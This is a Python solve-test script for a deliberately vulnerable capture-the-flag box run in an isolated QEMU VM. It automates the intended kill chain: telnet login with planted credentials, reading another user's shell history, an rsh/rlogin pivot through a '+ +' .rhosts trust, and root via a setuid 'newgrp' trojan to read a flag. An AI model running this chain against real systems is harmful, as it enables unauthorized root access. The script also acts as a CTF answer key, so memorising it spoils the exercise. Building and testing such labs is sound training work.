#!/usr/bin/env python3
"""End-to-end SOLVE TEST: boot the finished box host-only and walk the intended
kill chain over the forwarded telnet port, exactly as a player would:

    telnet brian  ->  read pei's breadcrumb  ->  rlogin as dono (.rhosts "+ +")
    ->  newgrp -hack root (setuid trojan)  ->  root  ->  read the loot flag

Exits 0 only if a uid=0 shell is reached AND the expected flag is recovered.
This is the gate for "the box is solvable end to end".
"""
import os
import socket
import subprocess
import sys
import time

import pexpect

QEMU   = os.environ.get("QEMU_BIN", "qemu-system-i386")
IMAGE  = os.environ["BOX_IMAGE_ABS"]
MACHINE= os.environ.get("BOX_MACHINE", "pc")
CPU    = os.environ.get("BOX_CPU", "pentium")
MEM    = os.environ.get("BOX_MEM_MB", "128")
TPORT  = os.environ.get("BOX_FWD_TELNET", "2323")
FPORT  = os.environ.get("BOX_FWD_FTP", "2121")
SPORT  = os.environ.get("BOX_FWD_SHELL", "5514")
FUSER  = os.environ.get("BOX_FOOTHOLD_USER", "brian")
FPASS  = os.environ.get("BOX_FOOTHOLD_PASS", "newriver")
DUSER  = os.environ.get("BOX_TRUST_USER", "dono")
LOOTD  = os.environ.get("BOX_LOOT_DIR", "/usr/src/sys/maniac")
EXPECT = os.environ.get("BOX_EXPECT_FLAG", "")
SERLOG = os.environ.get("BOX_SOLVE_SERIAL", "work/solve-serial.log")
CR = "\r"

def log(m): print(f"[solve] {m}", file=sys.stderr, flush=True)
def reap(): subprocess.run(["pkill", "-9", "-f", os.path.basename(IMAGE)], check=False)

def boot_box():
    reap(); time.sleep(1)
    hostfwd = (f"hostfwd=tcp:127.0.0.1:{TPORT}-:23,"
               f"hostfwd=tcp:127.0.0.1:{FPORT}-:21,"
               f"hostfwd=tcp:127.0.0.1:{SPORT}-:513")
    cmd = [QEMU, "-machine", f"{MACHINE},graphics=off", "-cpu", CPU, "-m", MEM,
           "-drive", f"file={IMAGE},format=qcow2,if=ide,index=0,media=disk",
           "-boot", "c", "-display", "none",
           "-serial", f"file:{SERLOG}", "-monitor", "none", "-no-reboot",
           "-netdev", f"user,id=n0,restrict=on,{hostfwd}",
           "-device", "ne2k_pci,netdev=n0"]
    log("booting box (host-only, telnet on 127.0.0.1:%s)" % TPORT)
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def wait_telnet(deadline):
    """Poll the forwarded telnet port until the guest's telnetd answers."""
    log("waiting for multiuser boot + telnetd ...")
    while time.time() < deadline:
        try:
            s = socket.create_connection(("127.0.0.1", int(TPORT)), timeout=3)
            s.close()
            log("telnet port is open")
            return True
        except OSError:
            time.sleep(5)
    return False

def expect_prompt(child, prompt, tmo=60):
    child.expect(prompt, timeout=tmo)

def main():
    box = boot_box()
    try:
        if not wait_telnet(time.time() + 600):
            log("telnetd never came up — see %s" % SERLOG); return 1

        # The host-side hostfwd port opens as soon as QEMU starts, well before the
        # guest's ed1/inetd are actually up — so an early connect gets closed.
        # Retry until telnetd presents a login: prompt.
        tn = None
        for attempt in range(8):
            time.sleep(8)
            tn = pexpect.spawn(f"telnet 127.0.0.1 {TPORT}", encoding="latin-1", timeout=60)
            tn.logfile_read = open(SERLOG.replace(".log", "-telnet.log"), "w", encoding="latin-1")
            try:
                tn.expect(r"login:", timeout=30)
                break
            except (pexpect.TIMEOUT, pexpect.EOF):
                log(f"telnet attempt {attempt+1}: no login yet (guest net warming up), retry")
                try: tn.close(force=True)
                except Exception: pass
                tn = None
        if tn is None:
            log("telnetd never presented a login prompt — guest network down?"); return 1

        # ---- foothold: log in as brian -------------------------------------
        tn.sendline(FUSER)
        tn.expect(r"[Pp]assword:", timeout=30); tn.sendline(FPASS)
        # brian's shell is /bin/sh; set a unique prompt
        i = tn.expect([r"\$ ", r"% ", r"Login incorrect"], timeout=60)
        if i == 2:
            log("FOOTHOLD FAILED: brian/%s rejected" % FPASS); return 2
        # turn OFF terminal echo so command text isn't mistaken for output
        tn.sendline("stty -echo 2>/dev/null"); tn.expect([r"\$ ", r"% "], timeout=30)
        tn.sendline("PS1='BRIAN> '; export PS1"); tn.expect(r"BRIAN> ", timeout=30)
        log("foothold OK: logged in as %s" % FUSER)

        # ---- breadcrumb: pei's world-readable history ----------------------
        tn.sendline("grep -c newgrp /home/pei/.bash_history 2>/dev/null")
        tn.expect(r"BRIAN> ", timeout=30)
        log("breadcrumb (newgrp hits in pei history): %s" % tn.before.strip())

        # log the setuid bits of the r-tools (diagnostic for the trust pivot)
        tn.sendline("ls -l /usr/bin/rlogin /usr/bin/rsh /usr/libexec/rshd /usr/libexec/rlogind 2>&1")
        tn.expect(r"BRIAN> ", timeout=30)
        log("r-tools: " + " | ".join(l.strip() for l in tn.before.strip().splitlines() if "/" in l))

        # ---- pivot: prove the .rhosts "+ +" trust with rsh (non-interactive) ----
        tn.sendline(f"rsh localhost -l {DUSER} id 2>&1")
        tn.expect(r"BRIAN> ", timeout=60)
        rshout = tn.before
        log("rsh %s id -> %r" % (DUSER, " ".join(rshout.strip().split())[:160]))
        if "uid=" not in rshout:
            log("TRUST FAILED: rsh as %s did not run (see telnet log)" % DUSER); return 3
        log("pivot OK: rsh as %s without a password (.rhosts honoured)" % DUSER)

        # ---- now an interactive dono shell to drive newgrp ----------------------
        # Confirm the interactive rlogin path the PLAYER uses also works (no pw).
        tn.sendline(f"rlogin localhost -l {DUSER}")
        j = tn.expect([r"\$ ", r"% ", r"[Pp]assword:", r"BRIAN> "], timeout=60)
        if j == 2:
            log("note: rlogin asked for a password (rsh trust still works)")
        elif j == 3:
            log("note: interactive rlogin flaky; rsh trust confirmed above")
        else:
            log("interactive dono shell via rlogin OK")
            tn.sendline("exit"); tn.expect(r"BRIAN> ", timeout=30)  # back to brian

        # ---- privesc + loot in ONE shot: pipe commands into the root shell the
        #      setuid newgrp trojan spawns, reached as dono over the trust.  This
        #      avoids parsing nested interactive shells (echo state etc).
        tn.sendline("echo 'id; cat %s/flag.txt' | rsh localhost -l %s 'newgrp -hack root' 2>&1"
                    % (LOOTD, DUSER))
        tn.expect(r"BRIAN> ", timeout=90)
        body = tn.before
        if "uid=0" not in body:
            log("PRIVESC FAILED: no uid=0 from newgrp trojan (%r)" % " ".join(body.split())[:200])
            return 4
        log("privesc OK: uid=0 root shell via setuid newgrp trojan")
        flag = ""
        for line in body.splitlines():
            if "BU{" in line:
                flag = line[line.index("BU{"):].split("}")[0] + "}"
                break
        if not flag:
            log("LOOT FAILED: no BU{...} flag in %s/flag.txt" % LOOTD); return 5
        log("flag recovered: %s" % flag)
        if EXPECT and flag != EXPECT:
            log("FLAG MISMATCH: got %s, expected %s" % (flag, EXPECT)); return 6

        log("=== SOLVE OK: foothold -> trust -> setuid root -> flag ===")
        print(flag)
        return 0
    except (pexpect.TIMEOUT, pexpect.EOF) as e:
        log("%s during solve — see %s and %s" % (type(e).__name__, SERLOG,
            SERLOG.replace(".log", "-telnet.log")))
        return 1
    finally:
        reap()
        if box.poll() is None:
            box.terminate()

if __name__ == "__main__":
    sys.exit(main())
